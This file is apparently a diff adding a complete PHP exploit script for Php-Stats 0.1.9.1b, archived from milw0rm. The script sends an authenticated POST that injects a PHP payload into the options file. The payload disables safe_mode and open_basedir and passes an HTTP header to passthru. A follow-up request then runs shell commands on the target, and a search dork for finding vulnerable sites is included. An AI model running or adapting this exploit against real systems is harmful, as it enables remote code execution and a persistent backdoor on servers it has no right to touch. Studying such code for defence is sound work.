@@ -1,0 +1,189 @@
+<?php
+print_r('
+---------------------------------------------------------------------------
+Php-Stats <= 0.1.9.1b admin 2 exec() exploit
+by rgod
+mail: retrog at alice dot it
+site: http://retrogod.altervista.org
+
+dork example: inurl:php-stats.js.php
+---------------------------------------------------------------------------
+');
+
+/*
+to be used with
+http://retrogod.altervista.org/php_stats_0191b_sql.html or
+http://retrogod.altervista.org/php_stats_0191b_sql_ii.html
+
+you can inject php code in /option/php-stats-options.php
+through option_new[report_w_day] argument
+then you can execute commands through the main page
+*/
+
+if ($argc<4) {
+    print_r('
+---------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path pass cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to phpstats
+pass:      admin pass
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /stats/ ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost /php-stats/stats/ ls -la -p81
+---------------------------------------------------------------------------
+');
+    die;
+}
+
+error_reporting(7);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function send($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    $parts[1]=(int)$parts[1];
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$pass=$argv[3];
+$cmd="";
+$port=80;
+$proxy="";
+for ($i=4; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>'-p') and ($temp<>'-P')) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=(int)str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$data ="option_new%5Bstats_disabled%5D=0";
+$data.="&option_new%5Blanguage%5D=it";
+$data.="&option_new%5Bcifre%5D=8";
+$data.="&option_new%5Bstile%5D=1";
+$data.="&option_new%5Buser_mail%5D=A@A.COM";
+$data.="&option_new%5Badmin_pass%5D=";
+$data.="&option_new%5Bpass_confirm%5D=";
+$data.="&option_new%5Buse_pass%5D=0";
+$data.="&option_new%5Btimezone%5D=0";
+$data.="&option_new%5Bnomesito%5D=%20";
+$data.="&option_new%5Bserver_url%5D=".urlencode("http://".$host);
+$data.="&option_new%5Btemplate%5D=default";
+$data.="&option_new%5Bstarthits%5D=0";
+$data.="&option_new%5Bstartvisits%5D=0";
+$data.="&option%5Bmoduli_0%5D=1";
+$data.="&option%5Bmoduli_1%5D=1";
+$data.="&option%5Bmoduli_m_1%5D=1";
+$data.="&option%5Bmoduli_2%5D=1";
+$data.="&option%5Bmoduli_3%5D=1";
+$data.="&option%5Bmoduli_4%5D=1";
+$data.="&option%5Bmoduli_m_4%5D=1";
+$data.="&option%5Bmoduli_6%5D=1";
+$data.="&option%5Bmoduli_11%5D=1";
+$data.="&option_new%5Bprune_0_on%5D=1";
+$data.="&option_new%5Bprune_0_value%5D=24";
+$data.="&option_new%5Bprune_1_value%5D=100";
+$data.="&option_new%5Bprune_2_value%5D=1000";
+$data.="&option_new%5Bprune_3_value%5D=1000";
+$data.="&option_new%5Bprune_4_value%5D=1000";
+$data.="&option_new%5Bprune_5_value%5D=1000";
+$data.="&option_new%5Bauto_optimize%5D=1";
+$data.="&option_new%5Bauto_opt_every%5D=100";
+
+//do not touch
+$shell="6,instat_report_w=>1,auto_optimize=>1,auto_opt_every=>100,exc_fol=>1,exc_sip=>1,exc_dip=>1);";
+
+$shell.='ini_restore(safe_mode);ini_restore(open_basedir);error_reporting(0);set_time_limit(0);passthru($_SERVER[HTTP_S]);';
+
+$shell.='$sun=Array(sun=>1';
+
+$data.="&option_new%5Breport_w_day%5D=".urlencode($shell);
+$data.="&option_new%5Bip_timeout%5D=1";
+$data.="&option_new%5Bpage_timeout%5D=1200";
+$packet ="POST ".$p."admin.php?action=preferenze&opzioni=applica HTTP/1.0\r\n";
+$packet.="User-Agent: Mozilla/5.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: pass_cookie=".md5($pass).";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+send($packet);
+sleep(1);
+
+$packet ="GET ".$p."admin.php HTTP/1.0\r\n";
+$packet.="User-Agent: Mozilla/5.0\r\n";
+$packet.="S: ".$cmd."\r\n";
+$packet.="Cookie: pass_cookie=".md5($pass)."; php_stats_cache=1;\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+send($packet);
+$temp=explode("<html>",$html);
+echo $temp[0];
+?>
+
+# milw0rm.com [2007-03-17]
